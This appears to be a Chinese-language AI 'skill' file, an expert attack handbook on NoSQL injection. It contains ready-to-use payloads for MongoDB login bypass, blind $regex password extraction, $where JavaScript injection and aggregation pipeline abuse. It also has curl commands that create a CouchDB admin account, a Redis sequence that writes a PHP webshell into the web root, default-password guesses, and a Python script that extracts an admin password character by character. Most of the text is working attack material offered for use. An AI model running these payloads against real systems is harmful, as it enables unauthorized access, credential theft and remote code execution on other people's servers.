# 技能：NoSQL注入——专家攻击手册

> **AI加载指令**：NoSQL注入与SQL注入在本质上有所不同。涵盖MongoDB操作符注入、认证绕过、盲式数据提取、聚合管道注入以及Redis/CouchDB特定攻击。仅了解SQLi模式的测试人员极易忽略NoSQL注入。

---

## 1. 核心概念——操作符注入

**SQL注入**会破坏字符串字面量。  
**NoSQL注入**注入**查询操作符**以改变查询逻辑。

MongoDB示例——正常查询：
```javascript
db.users.find({username: "alice", password: "secret"})
```

通过JSON操作符注入：
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ 变为：`find({username:"admin", password:{$gt:""}})` → 密码 > "" → 始终为真！

---

## 2. MongoDB——登录绕过

### JSON请求体注入（具有JSON Content-Type的API）
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST`数组注入（URL编码表单）
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params`数组注入
与PHP相同——使用方括号表示法注入对象：
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL编码的`$`

---

## 3. MongoDB注入操作符

| 操作符 | 含义 | 用例 |
|---|---|---|
| `$ne` | 不等于 | `{"password": {"$ne": "x"}}` → 始终匹配 |
| `$gt` | 大于 | `{"password": {"$gt": ""}}` → 所有非空密码匹配 |
| `$gte` | 大于或等于 | 与$gt类似 |
| `$lt` | 小于 | `{"password": {"$lt": "~"}}` → 所有ASCII匹配 |
| `$regex` | 正则匹配 | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS表达式 | 最危险——代码执行 |
| `$exists` | 字段存在 | `{"admin": {"$exists": true}}` |
| `$in` | 数组中包含 | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. 通过$regex进行盲式数据提取

类似于SQLi中的二分查找，使用`$regex`逐字符提取字段值：

```json
// 管理员的密码是否以'a'开头？
{"username": "admin", "password": {"$regex": "^a"}}

// 管理员的密码是否以'b'开头？
{"username": "admin", "password": {"$regex": "^b"}}

// 继续：逐位置缩小范围
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**响应差异**：成功登录与失败登录的差异 = 布尔型或然器。

**自动化**：使用NoSQLMap或自定义脚本在字符集上进行二分查找。

---

## 5. MongoDB $where注入（JS执行）

`$where`在MongoDB上下文中评估JavaScript。  
**只能使用当前文档的字段**——无法进行系统访问。但允许逻辑滥用：

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// 通过时间进行盲式提取：
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// 通过JS进行正则：
{"$where": "this.username.match(/^adm/) && true"}
```

**限制**：`$where`不会提供操作系统命令执行——**服务器端JS注入**（与命令注入不同）。

---

## 6. 聚合管道注入

当用户控制的数据进入`$match`或`$group`阶段：

```javascript
// 易受攻击的代码：
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

注入操作符以绕过：
```json
// 作为对象输入：
{"$ne": null}  → 匹配所有分类
{"$regex": ".*"}  → 匹配所有
```

---

## 7. NoSQL的HTTP参数污染

某些框架（Express.js、PHP）将重复参数解析为数组：
```
?filter=value1&filter=value2 → filter = ["value1", "value2"]
```

使用Node.js中的`qs`库解析行为：
```
?filter[$ne]=invalid
→ 解析为：filter = {$ne: "invalid"}
→ NoSQL操作符注入
```

---

## 8. CouchDB攻击

### HTTP管理员API（如果暴露）
```bash
# 列出数据库：
curl http://target.com:5984/_all_dbs

# 读取数据库中的所有文档：
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# 创建管理员账户（如果允许匿名访问）：
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. Redis注入

Redis暴露（6379）且无认证——通过Redis查询中使用的输入进行命令注入：

```
# 通过SSRF或直接注入：
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

**认证绕过**（使用简单密码的旧版Redis）：
```
AUTH password
AUTH 123456
AUTH redis
AUTH admin
```

---

## 10. 检测载荷

将这些发送到任何由NoSQL后端处理的输入：

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', sleep(1000)
1' ; sleep(1000)
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
```

**JSON变体测试**（如果端点是表单基础的，则将Content-Type更改为`application/json`）：
```json
{"username": "admin", "password": {"$ne": ""}}
```

---

## 11. NoSQL与SQL——关键差异

| 方面 | SQLi | NoSQLi |
|---|---|---|
| 语言 | SQL语法 | 查询操作符对象 |
| 注入向量 | 字符串连接 | 对象/操作符注入 |
| 常见信号 | 引号破坏响应 | `{$ne:x}`改变响应 |
| 提取方法 | UNION / 基于错误的 | `$regex`字符或然器 |
| 认证绕过 | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS命令 | xp_cmdshell (MSSQL) | 罕见（需要`$where` + CVE） |
| 指纹识别 | 特定数据库错误消息 | "不能使用$"错误 |

---

## 12. 测试清单

```
□ 测试登录字段：{"$ne": "invalid"} JSON请求体
□ 测试URL编码表单：password[$ne]=invalid
□ 测试$regex进行字段值的盲式枚举
□ 尝试$where配合sleep()进行基于时间的盲式测试
□ 检查5984端口（CouchDB未认证管理员）
□ 检查6379端口（Redis未认证）
□ 在表单端点上尝试Content-Type: application/json
□ 监控与操作符相关的错误消息（"BSON" "操作符" "$not allowed"）
```

---

## 13. 盲式NoSQL提取自动化

### $regex逐字符提取（Python模板）

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

### 通过URL编码GET参数的$regex

```
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^ab.*
# 遍历字符集直到登录成功
```

### 重复键绕过

```json
// 当应用检查一个键但处理另一个键时：
{"id": "10", "id": "100"}
// JSON解析器通常使用最后一个出现的值
// 绕过：WAF验证id=10，应用处理id=100
```

---

## 14. 聚合管道注入

当用户输入到达MongoDB聚合管道阶段：

```javascript
// 如果用户控制$match阶段：
db.collection.aggregate([
  { $match: { user: INPUT } }  // INPUT来自用户
])

// 注入：提供对象而不是字符串
// INPUT = {"$gt": ""} → 匹配所有文档

// $lookup用于跨集合数据访问：
// 如果$lookup阶段可注入：
{ $lookup: {
    from: "admin_users",       // 攻击者选择的集合
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}

// $out将结果写入新集合：
{ $out: "public_collection" }  // 将查询结果写入可访问的集合
```

### $where JavaScript执行

```javascript
// $where允许任意JavaScript（危险）：
db.users.find({ $where: "this.username == 'admin'" })

// 如果输入到达$where：
// 注入：' || 1==1 || '
// 或：'; return true; var x='
// 时间型：'; sleep(5000); var x='
// 数据泄露：'; if(this.password[0]=='a'){sleep(5000)}; var x='
```

**参考**：Soroush Dalili — "MongoDB NoSQL注入与聚合管道"（2024）

**注意**：`$where`在服务器上运行JavaScript。除了逻辑滥用和基于时间的或然器，没有严格V8沙盒的旧版MongoDB历史上有RCE风险；建议将任何`$where`接收点视为高风险。
